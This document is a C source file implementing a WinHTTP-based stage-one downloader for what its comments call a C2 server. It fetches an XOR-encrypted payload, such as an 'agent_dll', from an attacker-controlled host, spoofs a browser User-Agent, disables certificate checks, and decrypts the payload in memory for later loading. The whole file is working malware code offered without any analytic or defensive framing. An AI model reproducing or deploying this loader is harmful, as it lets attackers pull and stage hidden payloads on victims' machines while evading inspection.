/*
 * winhttp_dl.c — HTTPS download helper using native WinHTTP / Schannel
 *
 * Downloads arbitrary bytes from the C2 server over HTTPS (TLS 1.2/1.3
 * handled entirely by Windows Schannel — zero external crypto libraries).
 *
 * The server sends:  4 bytes (data_len LE u32) + N bytes (XOR-encrypted body).
 * Caller is responsible for XOR decrypting and freeing the returned buffer.
 */

#include "winhttp_dl.h"
#include "config.h"
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* XOR decrypt in-place */
void xor_decrypt(BYTE* buf, DWORD len, const BYTE* key, DWORD key_len) {
    for (DWORD i = 0; i < len; i++) {
        buf[i] ^= key[i % key_len];
    }
}

/*
 * winhttp_download
 *
 * Downloads data from http(s)://<host>:<port><path>.
 * Uses HTTPS when DOWNLOAD_USE_HTTPS=1, plain HTTP when 0.
 * Allocates *out_buf (caller must LocalFree).
 * Returns TRUE on success.
 */
BOOL winhttp_download(
    const char*  host_a,   /* ASCII C2 host */
    WORD         port,
    const char*  path_a,   /* ASCII path e.g. "/api/stage1/agent_dll" */
    BYTE**       out_buf,
    DWORD*       out_len
) {
    BOOL  ok      = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BYTE* accum   = NULL;
    DWORD total   = 0;

    /* Convert ASCII → wide for WinHTTP */
    wchar_t host_w[256] = {0};
    wchar_t path_w[512] = {0};
    mbstowcs(host_w, host_a, 255);
    mbstowcs(path_w, path_a, 511);

    /* Open WinHTTP session */
    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!hSession) goto cleanup;

    /* Set timeouts */
    WinHttpSetTimeouts(hSession,
        HTTP_CONNECT_TIMEOUT_MS,
        HTTP_CONNECT_TIMEOUT_MS,
        HTTP_RECV_TIMEOUT_MS,
        HTTP_RECV_TIMEOUT_MS);

    /* Connect to C2 */
    hConnect = WinHttpConnect(hSession, host_w, port, 0);
    if (!hConnect) goto cleanup;

#if DOWNLOAD_USE_HTTPS
    /* Open HTTPS GET request */
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        path_w,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!hRequest) goto cleanup;

    /* Allow self-signed / any cert for C2 */
    DWORD sec_flags =
        SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest,
        WINHTTP_OPTION_SECURITY_FLAGS,
        &sec_flags, sizeof(sec_flags));

    /* Force TLS 1.2+ */
    DWORD tls_flags =
        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 |
        WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(hSession,
        WINHTTP_OPTION_SECURE_PROTOCOLS,
        &tls_flags, sizeof(tls_flags));
#else
    /* Open plain HTTP GET request */
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        path_w,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0   /* no WINHTTP_FLAG_SECURE → plain HTTP */
    );
    if (!hRequest) goto cleanup;
#endif

    /* Send request */
    if (!WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        goto cleanup;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;

    /* Check HTTP status */
    DWORD status = 0, status_size = sizeof(status);
    WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &status, &status_size, WINHTTP_NO_HEADER_INDEX);
    if (status != 200) goto cleanup;

    /*
     * Response protocol (matches server handler):
     *   4 bytes  : data_len (LE u32) — size of the XOR-encrypted body
     *   data_len : XOR-encrypted payload bytes
     */
    DWORD expected_len = 0;
    DWORD bytes_read   = 0;

    /* Read the 4-byte length prefix */
    if (!WinHttpReadData(hRequest, &expected_len, sizeof(DWORD), &bytes_read)
        || bytes_read != sizeof(DWORD)) {
        goto cleanup;
    }
    if (expected_len == 0 || expected_len > MAX_DOWNLOAD_BYTES) goto cleanup;

    /* Allocate buffer */
    accum = (BYTE*)LocalAlloc(LPTR, expected_len);
    if (!accum) goto cleanup;

    /* Read body */
    DWORD offset = 0;
    while (offset < expected_len) {
        DWORD chunk = 0;
        DWORD to_read = expected_len - offset;
        if (to_read > 65536) to_read = 65536;

        if (!WinHttpReadData(hRequest, accum + offset, to_read, &chunk)) break;
        if (chunk == 0) break;
        offset += chunk;
    }
    if (offset != expected_len) goto cleanup;

    /* XOR decrypt in-place */
    xor_decrypt(accum, expected_len,
                (const BYTE*)STAGE1_XOR_KEY, STAGE1_XOR_KEY_LEN);

    *out_buf = accum;
    *out_len = expected_len;
    accum    = NULL;   /* ownership transferred */
    ok       = TRUE;

cleanup:
    if (accum)    LocalFree(accum);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    return ok;
}
